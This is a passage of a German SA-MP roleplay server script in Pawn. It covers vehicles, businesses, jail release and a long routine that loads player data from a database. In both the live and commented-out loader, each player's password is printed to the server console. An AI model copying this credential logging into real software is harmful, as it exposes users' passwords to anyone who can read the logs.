										SetVehicleParamsEx(vid, VEHICLE_PARAMS_OFF, lights, alarm, doors, bonnet, boot, objective); // ONLY the engine param was changed to VEHICLE_PARAMS_ON (1)
		        						GameTextForPlayer(i,"~w~~n~~n~~n~~n~~n~~n~~n~~n~Kein Benzin mehr~n~Motor wurde abgeschaltet",1500,3);
							  		}
				  		     }
						}
					}
				}
			}
		}
	}
	return 1;
}

forward GetOwner(veh);
public GetOwner(veh)
{
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        for(new x = 0; x < MaxVeh; x++)
        {
            if(PlayerCar[i][x][CarId] == veh){return i;}
        }
    }
    return 555;
}
forward GetOwnerSlot(veh);
public GetOwnerSlot(veh)
{
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        for(new x = 0; x < MaxVeh; x++)
        {
            if(PlayerCar[i][x][CarId] == veh){return x;}
        }
    }
    return 555;
}
public PrintSBizInfo(playerid,targetid)
{
    if(IsPlayerConnected(playerid))
    {
        new coordsstring[256];
        SCM(playerid, COLOR_GREEN,"_______________________________________");
        format(coordsstring, sizeof(coordsstring),"*** %s ***",SBizzInfo[targetid][sbMessage]);
        SCM(playerid, COLOR_WHITE,coordsstring);
        format(coordsstring, sizeof(coordsstring), "Verschlossen: %d Eintrittspreis: $%d Kasse: $%d", SBizzInfo[targetid][sbLocked], SBizzInfo[targetid][sbEntranceCost], SBizzInfo[targetid][sbTill]);
        SCM(playerid, COLOR_GRAD1,coordsstring);
        format(coordsstring, sizeof(coordsstring), "Produkte: %d/%d", SBizzInfo[targetid][sbProducts],SBizzInfo[targetid][sbMaxProducts]);
        SCM(playerid, COLOR_GRAD2,coordsstring);
        SCM(playerid, COLOR_GREEN,"_______________________________________");
    }
}
public PrintBizInfo(playerid,targetid)
{
    if(IsPlayerConnected(playerid))
    {
        new coordsstring[256];
        SCM(playerid, COLOR_GREEN,"_______________________________________");
        format(coordsstring, sizeof(coordsstring),"*** %s ***",BizzInfo[targetid][bMessage]);
        SCM(playerid, COLOR_WHITE,coordsstring);
        format(coordsstring, sizeof(coordsstring), "Verschlossen: %d Eintrittspreis: $%d Kasse: $%d", BizzInfo[targetid][bLocked], BizzInfo[targetid][bEntranceCost], BizzInfo[targetid][bTill]);
        SCM(playerid, COLOR_GRAD1,coordsstring);
        format(coordsstring, sizeof(coordsstring), "Produkte: %d/%d", BizzInfo[targetid][bProducts],BizzInfo[targetid][bMaxProducts]);
        SCM(playerid, COLOR_GRAD2,coordsstring);
        SCM(playerid, COLOR_GREEN,"_______________________________________");
    }
}
public ShowMarke(playerid,targetid)
{
    if(IsPlayerConnected(targetid)&&IsPlayerConnected(targetid))
    {
        new ttext[20];
        if(PlayerInfo[targetid][sMember] == 1) { ttext = "Polizist"; }
        else if(PlayerInfo[targetid][sMember] == 2) { ttext = "FBI"; }
        else if(PlayerInfo[targetid][sMember] == 3) { ttext = "Bundeswehr"; }
        new coordsstring[256];
        format(coordsstring, sizeof(coordsstring),"------- [Dienst-Marke von %s] -------",GetName(targetid));
        SCM(targetid, COLOR_LIGHTBLUE,coordsstring);
        format(coordsstring, sizeof(coordsstring), "Name: %s | Zugehörige Fraktion: %s ",GetName(targetid), ttext);
        SCM(targetid, COLOR_WHITE,coordsstring);
        format(coordsstring, sizeof(coordsstring), "Du hast deine Marke %s gezeigt. ",GetName(targetid));
        SCM(playerid, COLOR_WHITE, coordsstring);
    }
}
forward ReleasePlayerFromJail(playerid);
public ReleasePlayerFromJail(playerid)
{
	new i = playerid;
    if(PlayerInfo[i][pJailed] > 0 || PlayerInfo[i][pPrison] == 1)
    {
        PlayerInfo[i][pJailTime] = 0;
        if(PlayerInfo[i][pJailed] == 1)
        {
            SetPlayerInterior(i, 0);
			SetPlayerSkin(playerid, PlayerInfo[playerid][pChar]);
            SetPlayerPos(i,1542.7798,-1675.7737,13.5552);// LSPD
        }
        else if(PlayerInfo[i][pJailed] == 2)
        {
            SetPlayerInterior(i, 0);
            SetPlayerSkin(playerid, PlayerInfo[playerid][pChar]);
            SetPlayerPos(i, -1605.5864,711.7393,13.8672);// SFPD
        }
        else if(PlayerInfo[i][pPrison] == 1)
        {
            SetPlayerInterior(i, 0);
            SetPlayerSkin(playerid, PlayerInfo[playerid][pChar]);
            SetPlayerPos(i, -1605.5864,711.7393,13.8672);// SFPD
        }
        new string[128];
        PlayerInfo[i][pPrison] = 0;
        PlayerInfo[i][pJailed] = 0;
        PlayerInfo[i][pJailTime] = 0;
        format(string, sizeof(string), "~g~Du bist frei!~n~~w~Bitte benimm dich in der Zukunft!");
        GameTextForPlayer(i, string, 5000, 1);
        if(gTeam[i] == 4)
		{
		gTeam[i] = 3;
		}
        ClearCrime(i);
        SetPlayerToTeamColor(i);
        return 1;
    }
    return 1;
}





Function IsAZug(carid)
{
	for(new i = 0; i < sizeof(Zug); i++)
   	{
		if(carid == Zug[i])
  		{
        	return 1;
  		}
   	}
   	return 0;
}
Function IsAFarmFahrzeug(carid)
{
	for(new i = 0; i < sizeof(FarmFahrzeug); i++)
   	{
		if(carid == FarmFahrzeug[i])
  		{
        	return 1;
  		}
   	}
   	return 0;
}

Function IsAEventCar(carid)
{
	for(new i = 0; i < sizeof(CreatedCars); i++)
	{
		if(carid == CreatedCars[i])
  		{
        	return 1;
  		}
	}
   	return 0;
}

Function IsABusCar(carid)
{
	for(new i = 0; i < sizeof(BusVehs); i++)
   	{
		if(carid == BusVehs[i])
  		{
        	return 1;
  		}
   	}
   	return 0;
}

Function IsAPilotCar(carid)
{
	for(new i = 0; i < sizeof(PilotenVehs); i++)
   	{
		if(carid == PilotenVehs[i])
  		{
        	return 1;
  		}
   	}
   	return 0;
}
public OnVehicleSirenStateChange(playerid, vehicleid, newstate)
{
    if(newstate) GameTextForPlayer(playerid, "~W~Sirene ~G~an", 1000, 1);
    else GameTextForPlayer(playerid, "~W~Sirene ~r~aus", 1000, 1);
    return 1;
}









forward LoadPlayer(playerid);
public LoadPlayer(playerid)
{
		    new rows,string[128];
//		    cache_get_data(rows, fields);
            cache_get_row_count(rows);
		    if(rows)
		    {
			        new val[128];
                 	SetPlayerHealth(playerid,100);
		            printf("Spieler %s wird geladen", PlayerInfo[playerid][Name]);
				    cache_get_value_name(0,"passwort",PlayerInfo[playerid][pHzreb83],128);
		            printf("PW %s wird geladen", PlayerInfo[playerid][pHzreb83]);
		            printf("PW %i wird geladen", PlayerInfo[playerid][pHzreb83]);

				    cache_get_value_name_int(0,"admin",PlayerInfo[playerid][pAdmin]);
			        cache_get_value_name_int(0,"level",PlayerInfo[playerid][pLevel]);
			        cache_get_value_name_int(0,"reg",PlayerInfo[playerid][pReg]);
			        cache_get_value_name_int(0,"sex",PlayerInfo[playerid][pSex]);
			        cache_get_value_name_int(0,"age",PlayerInfo[playerid][pAge]);
			        cache_get_value_name_int(0,"origin",PlayerInfo[playerid][pOrigin]);
			        cache_get_value_name_int(0,"ck",PlayerInfo[playerid][pCK]);
					cache_get_value_name_int(0,"muted",PlayerInfo[playerid][pMuted]);
			        cache_get_value_name_int(0,"exp",PlayerInfo[playerid][pExp]);
			        cache_get_value_name_int(0,"pBomben",PlayerInfo[playerid][pBomben]);
			        cache_get_value_name_int(0,"cash",PlayerInfo[playerid][pCash]);
			        cache_get_value_name_int(0,"account",PlayerInfo[playerid][pAccount]);
			        cache_get_value_name_int(0,"crimes",PlayerInfo[playerid][pCrimes]);
			        cache_get_value_name_int(0,"kills",PlayerInfo[playerid][pKills]);


			        cache_get_value_name_int(0,"deaths",PlayerInfo[playerid][pDeaths]);
			        cache_get_value_name_int(0,"arrested",PlayerInfo[playerid][pArrested]);
			        cache_get_value_name_int(0,"wanteddeaths",PlayerInfo[playerid][pWantedDeaths]);
			        cache_get_value_name_int(0,"phonebook",PlayerInfo[playerid][pPhoneBook]);
			        cache_get_value_name_int(0,"lottonr",PlayerInfo[playerid][pLottoNr]);
			        cache_get_value_name_int(0,"fishes",PlayerInfo[playerid][pFishes]);
			        cache_get_value_name_int(0,"biggestfish",PlayerInfo[playerid][pBiggestFish]);

			        cache_get_value_name_int(0,"job",PlayerInfo[playerid][pJob]);
			        cache_get_value_name_int(0,"paycheck",PlayerInfo[playerid][pPayCheck]);
			        cache_get_value_name_int(0,"headvalue",PlayerInfo[playerid][pHeadValue]);
			        cache_get_value_name_int(0,"jailed",PlayerInfo[playerid][pJailed]);
			        cache_get_value_name_int(0,"gangjailed",PlayerInfo[playerid][pGangJailed]);
			        cache_get_value_name_int(0,"mauled",PlayerInfo[playerid][pMauled]);
			        cache_get_value_name_int(0,"jailtime",PlayerInfo[playerid][pJailTime]);
			        cache_get_value_name_int(0,"drugs",PlayerInfo[playerid][pDrugs]);
			        cache_get_value_name_int(0,"boxmats",PlayerInfo[playerid][pBoxMats]);
			        cache_get_value_name_int(0,"boxdrugs",PlayerInfo[playerid][pBoxDrugs]);
			        cache_get_value_name_int(0,"leader",PlayerInfo[playerid][pLeader]);
			        cache_get_value_name_int(0,"member",PlayerInfo[playerid][pMember]);
			        cache_get_value_name_int(0,"smember",PlayerInfo[playerid][sMember]);
			        cache_get_value_name_int(0,"rank",PlayerInfo[playerid][pRank]);
			        cache_get_value_name_int(0,"char",PlayerInfo[playerid][pChar]);
			        cache_get_value_name_int(0,"contracttime",PlayerInfo[playerid][pContractTime]);
			        cache_get_value_name_int(0,"detskill",PlayerInfo[playerid][pDetSkill]);
			        cache_get_value_name_int(0,"lawskill",PlayerInfo[playerid][pLawSkill]);
			        cache_get_value_name_int(0,"mechskill",PlayerInfo[playerid][pMechSkill]);
			        cache_get_value_name_int(0,"jackskill",PlayerInfo[playerid][pJackSkill]);
			        cache_get_value_name_int(0,"carskill",PlayerInfo[playerid][pCarSkill]);
			        cache_get_value_name_int(0,"newsskill",PlayerInfo[playerid][pNewsSkill]);
			        cache_get_value_name_int(0,"drugsskill",PlayerInfo[playerid][pDrugsSkill]);
			        cache_get_value_name_int(0,"cookskill",PlayerInfo[playerid][pCookSkill]);
			        cache_get_value_name_int(0,"fishskill",PlayerInfo[playerid][pFishSkill]);
			        cache_get_value_name_int(0,"shealth",PlayerInfo[playerid][pSHealth]);
			        cache_get_value_name_float(0,"health",PlayerInfo[playerid][pHealth]);
			        cache_get_value_name_int(0,"int",PlayerInfo[playerid][pInt]);
			        cache_get_value_name_int(0,"local",PlayerInfo[playerid][pLocal]);
			        cache_get_value_name_int(0,"team",PlayerInfo[playerid][pTeam]);
			        cache_get_value_name_int(0,"model",PlayerInfo[playerid][pModel]);
			        cache_get_value_name_int(0,"pnumber",PlayerInfo[playerid][pPnumber]);
			        cache_get_value_name_int(0,"phousekey",PlayerInfo[playerid][pHouseKey]);

			        cache_get_value_name_int(0,"pbiskey",PlayerInfo[playerid][pPbiskey]);
			        cache_get_value_name_int(0,"handygeld",PlayerInfo[playerid][pHandyGeld]);

//			        cache_get_value_name_int(0,"pos_x",val); PlayerInfo[playerid][pPos_x] = strval(val);
//			        cache_get_value_name_int(0,"pos_y",val); PlayerInfo[playerid][pPos_y] = strval(val);
//			        cache_get_value_name_int(0,"pos_z",val); PlayerInfo[playerid][pPos_z] = strval(val);

			        cache_get_value_name_int(0,"carlic",PlayerInfo[playerid][pCarLic]);
			        cache_get_value_name_int(0,"flylic",PlayerInfo[playerid][pFlyLic]);
			        cache_get_value_name_int(0,"boatlic",PlayerInfo[playerid][pBoatLic]);
			        cache_get_value_name_int(0,"fishlic",PlayerInfo[playerid][pFishLic]);
			        cache_get_value_name_int(0,"gunlic",PlayerInfo[playerid][pGunLic]);
			        cache_get_value_name_int(0,"lkwlic",PlayerInfo[playerid][pLKWLic]);
			        cache_get_value_name_int(0,"motolic",PlayerInfo[playerid][pMotoLic]);
			        cache_get_value_name_int(0,"zig",PlayerInfo[playerid][pZig]);
			        cache_get_value_name_int(0,"gun1",PlayerInfo[playerid][pGun1]);
			        cache_get_value_name_int(0,"gun2",PlayerInfo[playerid][pGun2]);
			        cache_get_value_name_int(0,"gun3",PlayerInfo[playerid][pGun3]);
			        cache_get_value_name_int(0,"gun4",PlayerInfo[playerid][pGun4]);
			        cache_get_value_name_int(0,"ammo1",PlayerInfo[playerid][pAmmo1]);
			        cache_get_value_name_int(0,"ammo2",PlayerInfo[playerid][pAmmo2]);
			        cache_get_value_name_int(0,"ammo3",PlayerInfo[playerid][pAmmo3]);
			        cache_get_value_name_int(0,"ammo4",PlayerInfo[playerid][pAmmo4]);

			        cache_get_value_name_int(0,"mulltime",PlayerInfo[playerid][pMulltime]);
			        cache_get_value_name_int(0,"payday",PlayerInfo[playerid][pPayDay]);
			        cache_get_value_name_int(0,"paydayhad",PlayerInfo[playerid][pPayDayHad]);
			        cache_get_value_name_int(0,"wins",PlayerInfo[playerid][pWins]);
			        cache_get_value_name_int(0,"loses",PlayerInfo[playerid][pLoses]);
			        cache_get_value_name_int(0,"miserperk",PlayerInfo[playerid][pMiserPerk]);
			        cache_get_value_name_int(0,"painperk",PlayerInfo[playerid][pPainPerk]);
			        cache_get_value_name_int(0,"traderperk",PlayerInfo[playerid][pTraderPerk]);
			        cache_get_value_name_int(0,"warns",PlayerInfo[playerid][pWarns]);
			        cache_get_value_name_int(0,"adjustable",PlayerInfo[playerid][pAdjustable]);
			        cache_get_value_name_int(0,"married",PlayerInfo[playerid][pMarried]);
			        cache_get_value_name_int(0,"playminutes",PlayerInfo[playerid][pPlayMinutes]);
			        cache_get_value_name_int(0,"gesamtminutes",PlayerInfo[playerid][pGesamtMinutes]);
			        cache_get_value_name_int(0,"minutessincean",PlayerInfo[playerid][pMinutesSinceAn]);
			        cache_get_value_name_int(0,"fraksperre",PlayerInfo[playerid][pFrakSperre]);
			        cache_get_value_name_int(0,"gehalt",PlayerInfo[playerid][pGehalt]);
			        cache_get_value_name_int(0,"invweapon",PlayerInfo[playerid][pInvWeapon]);
			        cache_get_value_name_int(0,"invammo",PlayerInfo[playerid][pInvAmmo]);
			        cache_get_value_name_int(0,"invweapon2",PlayerInfo[playerid][pInvWeapon2]);
			        cache_get_value_name_int(0,"invammo2",PlayerInfo[playerid][pInvAmmo2]);
			        cache_get_value_name_int(0,"invmats",PlayerInfo[playerid][pInvMats]);
			        cache_get_value_name_int(0,"invdrugs",PlayerInfo[playerid][pInvDrugs]);
			        cache_get_value_name_int(0,"flugtime",PlayerInfo[playerid][pFlugTime]);
			        cache_get_value_name_int(0,"farmtime",PlayerInfo[playerid][pFarmTime]);
			        cache_get_value_name_int(0,"gdeaths",PlayerInfo[playerid][pGDeaths]);
			        cache_get_value_name_int(0,"gkills",PlayerInfo[playerid][pGKills]);

			        cache_get_value_name_float(0,"gwd",PlayerInfo[playerid][pGWD]);
			        cache_get_value_name_int(0,"erstehilfe",PlayerInfo[playerid][pErstehilfe]);
			        cache_get_value_name_int(0,"meldung",PlayerInfo[playerid][pMeldung]);
			        cache_get_value_name_int(0,"hitsound",PlayerInfo[playerid][pHitsound]);
			        cache_get_value_name_int(0,"ptankekey",PlayerInfo[playerid][pPtankekey]);
			        cache_get_value_name_int(0,"zollpass",PlayerInfo[playerid][pZollPass]);
			        cache_get_value_name_int(0,"gebannt",PlayerInfo[playerid][pGebannt]);
			        cache_get_value_name_int(0,"pcarp",PlayerInfo[playerid][pCarP]);
			        cache_get_value_name_int(0,"offlineflucht",OfflineFlucht[playerid]);
			        cache_get_value_name_int(0,"wantedlevel",WantedLevel[playerid]);
			        cache_get_value_name_int(0,"wantedpoints",WantedPoints[playerid]);
			        cache_get_value_name_int(0,"spawnchange",SpawnChange[playerid]);
			        cache_get_value_name_int(0,"premium",PlayerInfo[playerid][pDonateRank]);
			        cache_get_value_name_int(0,"prison",PlayerInfo[playerid][pPrison]);
			        cache_get_value_name_int(0,"admintickets",PlayerInfo[playerid][pAdminTickets]);
					cache_get_value_name_int(0,"mutedtime",PlayerInfo[playerid][pMutedTime]);
					cache_get_value_name_int(0,"tottime",PlayerInfo[playerid][pTotTime]);
					cache_get_value_name_int(0,"tot",PlayerInfo[playerid][pTot]);
				    cache_get_value_name(0,"marriedto",PlayerInfo[playerid][pMarriedTo],MAX_PLAYER_NAME);
					cache_get_value_name_int(0,"fuel",PlayerInfo[playerid][pFuel]);
					cache_get_value_name_int(0,"verreckt",PlayerInfo[playerid][pVerreckt]);
					cache_get_value_name_int(0,"orgleader",PlayerInfo[playerid][pOrgLeader]);   // FEHLER !!!!!!!!!!!!!!!!!!!!!!!!!!!!
					cache_get_value_name(0,"bangrund",PlayerInfo[playerid][pBanGrund],128);
					cache_get_value_name(0,"banadmin",PlayerInfo[playerid][pBanAdmin],MAX_PLAYER_NAME);
					cache_get_value_name(0,"bandauer",PlayerInfo[playerid][pBanDauer],128);
					cache_get_value_name_int(0,"helm",PlayerInfo[playerid][pHelm]);
					cache_get_value_name_int(0,"weather",PlayerInfo[playerid][pWeather]);
					cache_get_value_name_int(0,"amuted",PlayerInfo[playerid][paMuted]);
					cache_get_value_name_int(0,"amutedtime",PlayerInfo[playerid][paMutedTime]);
					cache_get_value_name_int(0,"carkeys",PlayerInfo[playerid][pCarkeys]);
					cache_get_value_name_int(0,"orgmember",PlayerInfo[playerid][pOrgMember]);
					cache_get_value_name_int(0,"orgrang",PlayerInfo[playerid][pOrgRang]);
					cache_get_value_name_int(0,"IsPlayerProjektleiter",PlayerInfo[playerid][pIsPlayerProjektleiter]);
					cache_get_value_name_int(0,"AdminPasswort",PlayerInfo[playerid][pAdminPasswort]);
					cache_get_value_name_int(0,"ichmusskuedigen",PlayerInfo[playerid][pichmusskuedigen]);
					cache_get_value_name_int(0,"prisoncps", PlayerInfo[playerid][pPrisonCPs]);
					cache_get_value_name_int(0,"fightingstyle", PlayerInfo[playerid][pFightingStyle]);
	                cache_get_value_name_int(0,"TutorialGemacht",TutorialGemacht[playerid]);
	                cache_get_value_name_int(0,"StartBonusErhalten",StartBonusErhalten[playerid]);

	                cache_get_value_name_int(0,"pSpielerWiederbelebt",PlayerInfo[playerid][pSpielerWiederbelebt]);









/*

					new val[128];
                 	SetPlayerHealth(playerid,100);
		            printf("Spieler %s wird geladen", PlayerInfo[playerid][Name]);
				    cache_get_field_content(0,"passwort",val); PlayerInfo[playerid][pHzreb83] = val;
		            printf("PW %s wird geladen", PlayerInfo[playerid][pHzreb83]);
		            printf("PW %i wird geladen", PlayerInfo[playerid][pHzreb83]);

				    cache_get_field_content(0,"admin",val); PlayerInfo[playerid][pAdmin] = strval(val);
			        cache_get_field_content(0,"level",val); PlayerInfo[playerid][pLevel] = strval(val);
			        cache_get_field_content(0,"reg",val); PlayerInfo[playerid][pReg] = strval(val);
			        cache_get_field_content(0,"sex",val); PlayerInfo[playerid][pSex] = strval(val);
			        cache_get_field_content(0,"age",val); PlayerInfo[playerid][pAge] = strval(val);
			        cache_get_field_content(0,"origin",val); PlayerInfo[playerid][pOrigin] = strval(val);
			        cache_get_field_content(0,"ck",val); PlayerInfo[playerid][pCK] = strval(val);
					cache_get_field_content(0,"muted",val); PlayerInfo[playerid][pMuted] = strval(val);
			        cache_get_field_content(0,"exp",val); PlayerInfo[playerid][pExp] = strval(val);
			        cache_get_field_content(0,"pBomben",val); PlayerInfo[playerid][pBomben] = strval(val);
			        cache_get_field_content(0,"cash",val); PlayerInfo[playerid][pCash] = strval(val);
			        cache_get_field_content(0,"account",val); PlayerInfo[playerid][pAccount] = strval(val);
			        cache_get_field_content(0,"crimes",val); PlayerInfo[playerid][pCrimes] = strval(val);
			        cache_get_field_content(0,"kills",val); PlayerInfo[playerid][pKills] = strval(val);
			        cache_get_field_content(0,"deaths",val); PlayerInfo[playerid][pDeaths] = strval(val);
			        cache_get_field_content(0,"arrested",val); PlayerInfo[playerid][pArrested] = strval(val);
			        cache_get_field_content(0,"wanteddeaths",val); PlayerInfo[playerid][pWantedDeaths] = strval(val);
			        cache_get_field_content(0,"phonebook",val); PlayerInfo[playerid][pPhoneBook] = strval(val);
			        cache_get_field_content(0,"lottonr",val); PlayerInfo[playerid][pLottoNr] = strval(val);
			        cache_get_field_content(0,"fishes",val); PlayerInfo[playerid][pFishes] = strval(val);
			        cache_get_field_content(0,"biggestfish",val); PlayerInfo[playerid][pBiggestFish] = strval(val);
			        cache_get_field_content(0,"job",val); PlayerInfo[playerid][pJob] = strval(val);
			        cache_get_field_content(0,"paycheck",val); PlayerInfo[playerid][pPayCheck] = strval(val);
			        cache_get_field_content(0,"headvalue",val); PlayerInfo[playerid][pHeadValue] = strval(val);
			        cache_get_field_content(0,"jailed",val); PlayerInfo[playerid][pJailed] = strval(val);
			        cache_get_field_content(0,"gangjailed",val); PlayerInfo[playerid][pGangJailed] = strval(val);
			        cache_get_field_content(0,"mauled",val); PlayerInfo[playerid][pMauled] = strval(val);
			        cache_get_field_content(0,"jailtime",val); PlayerInfo[playerid][pJailTime] = strval(val);
			        cache_get_field_content(0,"drugs",val); PlayerInfo[playerid][pDrugs] = strval(val);
			        cache_get_field_content(0,"boxmats",val); PlayerInfo[playerid][pBoxMats] = strval(val);
			        cache_get_field_content(0,"boxdrugs",val); PlayerInfo[playerid][pBoxDrugs] = strval(val);
			        cache_get_field_content(0,"leader",val); PlayerInfo[playerid][pLeader] = strval(val);
			        cache_get_field_content(0,"member",val); PlayerInfo[playerid][pMember] = strval(val);
			        cache_get_field_content(0,"smember",val); PlayerInfo[playerid][sMember] = strval(val);
			        cache_get_field_content(0,"rank",val); PlayerInfo[playerid][pRank] = strval(val);
			        cache_get_field_content(0,"char",val); PlayerInfo[playerid][pChar] = strval(val);
			        cache_get_field_content(0,"contracttime",val); PlayerInfo[playerid][pContractTime] = strval(val);
			        cache_get_field_content(0,"detskill",val); PlayerInfo[playerid][pDetSkill] = strval(val);
			        cache_get_field_content(0,"lawskill",val); PlayerInfo[playerid][pLawSkill] = strval(val);
			        cache_get_field_content(0,"mechskill",val); PlayerInfo[playerid][pMechSkill] = strval(val);
			        cache_get_field_content(0,"jackskill",val); PlayerInfo[playerid][pJackSkill] = strval(val);
			        cache_get_field_content(0,"carskill",val); PlayerInfo[playerid][pCarSkill] = strval(val);
			        cache_get_field_content(0,"newsskill",val); PlayerInfo[playerid][pNewsSkill] = strval(val);
			        cache_get_field_content(0,"drugsskill",val); PlayerInfo[playerid][pDrugsSkill] = strval(val);
			        cache_get_field_content(0,"cookskill",val); PlayerInfo[playerid][pCookSkill] = strval(val);
			        cache_get_field_content(0,"fishskill",val); PlayerInfo[playerid][pFishSkill] = strval(val);
			        cache_get_field_content(0,"shealth",val); PlayerInfo[playerid][pSHealth] = strval(val);
			        cache_get_field_content(0,"health",val); PlayerInfo[playerid][pHealth] = strval(val);
			        cache_get_field_content(0,"int",val); PlayerInfo[playerid][pInt] = strval(val);
			        cache_get_field_content(0,"local",val); PlayerInfo[playerid][pLocal] = strval(val);
			        cache_get_field_content(0,"team",val); PlayerInfo[playerid][pTeam] = strval(val);
			        cache_get_field_content(0,"model",val); PlayerInfo[playerid][pModel] = strval(val);
			        cache_get_field_content(0,"pnumber",val); PlayerInfo[playerid][pPnumber] = strval(val);
			        cache_get_field_content(0,"phousekey",val); PlayerInfo[playerid][pHouseKey] = strval(val);
			        cache_get_field_content(0,"pbiskey",val); PlayerInfo[playerid][pPbiskey] = strval(val);
			        cache_get_field_content(0,"handygeld",val); PlayerInfo[playerid][pHandyGeld] = strval(val);
			        cache_get_field_content(0,"pos_x",val); PlayerInfo[playerid][pPos_x] = strval(val);
			        cache_get_field_content(0,"pos_y",val); PlayerInfo[playerid][pPos_y] = strval(val);
			        cache_get_field_content(0,"pos_z",val); PlayerInfo[playerid][pPos_z] = strval(val);
			        cache_get_field_content(0,"carlic",val); PlayerInfo[playerid][pCarLic] = strval(val);
			        cache_get_field_content(0,"flylic",val); PlayerInfo[playerid][pFlyLic] = strval(val);
			        cache_get_field_content(0,"boatlic",val); PlayerInfo[playerid][pBoatLic] = strval(val);
			        cache_get_field_content(0,"fishlic",val); PlayerInfo[playerid][pFishLic] = strval(val);
			        cache_get_field_content(0,"gunlic",val); PlayerInfo[playerid][pGunLic] = strval(val);
			        cache_get_field_content(0,"lkwlic",val); PlayerInfo[playerid][pLKWLic] = strval(val);
			        cache_get_field_content(0,"motolic",val); PlayerInfo[playerid][pMotoLic] = strval(val);
			        cache_get_field_content(0,"zig",val); PlayerInfo[playerid][pZig] = strval(val);
			        cache_get_field_content(0,"gun1",val); PlayerInfo[playerid][pGun1] = strval(val);
			        cache_get_field_content(0,"gun2",val); PlayerInfo[playerid][pGun2] = strval(val);
			        cache_get_field_content(0,"gun3",val); PlayerInfo[playerid][pGun3] = strval(val);
			        cache_get_field_content(0,"gun4",val); PlayerInfo[playerid][pGun4] = strval(val);
			        cache_get_field_content(0,"ammo1",val); PlayerInfo[playerid][pAmmo1] = strval(val);
			        cache_get_field_content(0,"ammo2",val); PlayerInfo[playerid][pAmmo2] = strval(val);
			        cache_get_field_content(0,"ammo3",val); PlayerInfo[playerid][pAmmo3] = strval(val);
			        cache_get_field_content(0,"ammo4",val); PlayerInfo[playerid][pAmmo4] = strval(val);
			        cache_get_field_content(0,"mulltime",val); PlayerInfo[playerid][pMulltime] = strval(val);
			        cache_get_field_content(0,"payday",val); PlayerInfo[playerid][pPayDay] = strval(val);
			        cache_get_field_content(0,"paydayhad",val); PlayerInfo[playerid][pPayDayHad] = strval(val);
			        cache_get_field_content(0,"wins",val); PlayerInfo[playerid][pWins] = strval(val);
			        cache_get_field_content(0,"loses",val); PlayerInfo[playerid][pLoses] = strval(val);
			        cache_get_field_content(0,"miserperk",val); PlayerInfo[playerid][pMiserPerk] = strval(val);
			        cache_get_field_content(0,"painperk",val); PlayerInfo[playerid][pPainPerk] = strval(val);
			        cache_get_field_content(0,"traderperk",val); PlayerInfo[playerid][pTraderPerk] = strval(val);
			        cache_get_field_content(0,"warns",val); PlayerInfo[playerid][pWarns] = strval(val);
			        cache_get_field_content(0,"adjustable",val); PlayerInfo[playerid][pAdjustable] = strval(val);
			        cache_get_field_content(0,"married",val); PlayerInfo[playerid][pMarried] = strval(val);
			        cache_get_field_content(0,"playminutes",val); PlayerInfo[playerid][pPlayMinutes] = strval(val);
			        cache_get_field_content(0,"gesamtminutes",val); PlayerInfo[playerid][pGesamtMinutes] = strval(val);
			        cache_get_field_content(0,"minutessincean",val); PlayerInfo[playerid][pMinutesSinceAn] = strval(val);
			        cache_get_field_content(0,"fraksperre",val); PlayerInfo[playerid][pFrakSperre] = strval(val);
			        cache_get_field_content(0,"gehalt",val); PlayerInfo[playerid][pGehalt] = strval(val);
			        cache_get_field_content(0,"invweapon",val); PlayerInfo[playerid][pInvWeapon] = strval(val);
			        cache_get_field_content(0,"invammo",val); PlayerInfo[playerid][pInvAmmo] = strval(val);
			        cache_get_field_content(0,"invweapon2",val); PlayerInfo[playerid][pInvWeapon2] = strval(val);
			        cache_get_field_content(0,"invammo2",val); PlayerInfo[playerid][pInvAmmo2] = strval(val);
			        cache_get_field_content(0,"invmats",val); PlayerInfo[playerid][pInvMats] = strval(val);
			        cache_get_field_content(0,"invdrugs",val); PlayerInfo[playerid][pInvDrugs] = strval(val);
			        cache_get_field_content(0,"flugtime",val); PlayerInfo[playerid][pFlugTime] = strval(val);
			        cache_get_field_content(0,"farmtime",val); PlayerInfo[playerid][pFarmTime] = strval(val);
			        cache_get_field_content(0,"gdeaths",val); PlayerInfo[playerid][pGDeaths] = strval(val);
			        cache_get_field_content(0,"gkills",val); PlayerInfo[playerid][pGKills] = strval(val);
			        cache_get_field_content(0,"gwd",val); PlayerInfo[playerid][pGWD] = strval(val);
			        cache_get_field_content(0,"erstehilfe",val); PlayerInfo[playerid][pErstehilfe] = strval(val);
			        cache_get_field_content(0,"meldung",val); PlayerInfo[playerid][pMeldung] = strval(val);
			        cache_get_field_content(0,"hitsound",val); PlayerInfo[playerid][pHitsound] = strval(val);
			        cache_get_field_content(0,"ptankekey",val); PlayerInfo[playerid][pPtankekey] = strval(val);
			        cache_get_field_content(0,"zollpass",val); PlayerInfo[playerid][pZollPass] = strval(val);
			        cache_get_field_content(0,"gebannt",val); PlayerInfo[playerid][pGebannt] = strval(val);
			        cache_get_field_content(0,"pcarp",val); PlayerInfo[playerid][pCarP] = strval(val);
			        cache_get_field_content(0,"offlineflucht",val); OfflineFlucht[playerid] = strval(val);
			        cache_get_field_content(0,"wantedlevel",val); WantedLevel[playerid] = strval(val);
			        cache_get_field_content(0,"wantedpoints",val); WantedPoints[playerid] = strval(val);
			        cache_get_field_content(0,"spawnchange",val); SpawnChange[playerid] = strval(val);
			        cache_get_field_content(0,"premium",val); PlayerInfo[playerid][pDonateRank] = strval(val);
			        cache_get_field_content(0,"prison",val); PlayerInfo[playerid][pPrison] = strval(val);
			        cache_get_field_content(0,"admintickets",val); PlayerInfo[playerid][pAdminTickets] = strval(val);
					cache_get_field_content(0,"mutedtime",val); PlayerInfo[playerid][pMutedTime] = strval(val);
					cache_get_field_content(0,"tottime",val); PlayerInfo[playerid][pTotTime] = strval(val);
					cache_get_field_content(0,"tot",val); PlayerInfo[playerid][pTot] = strval(val);
				    cache_get_field_content(0,"marriedto",val); PlayerInfo[playerid][pMarriedTo] = val;
					cache_get_field_content(0,"fuel",val); PlayerInfo[playerid][pFuel] = strval(val);
					cache_get_field_content(0,"verreckt",val); PlayerInfo[playerid][pVerreckt] = strval(val);
					cache_get_field_content(0,"orgleader",val); PlayerInfo[playerid][pOrgLeader] = strval(val);  // FEHLER !!!!!!!!!!!!!!!!!!!!!!!!!!!!
					cache_get_field_content(0,"bangrund",val); PlayerInfo[playerid][pBanGrund] = val;
					cache_get_field_content(0,"banadmin",val); PlayerInfo[playerid][pBanAdmin] = val;
					cache_get_field_content(0,"bandauer",val); PlayerInfo[playerid][pBanDauer] = val;
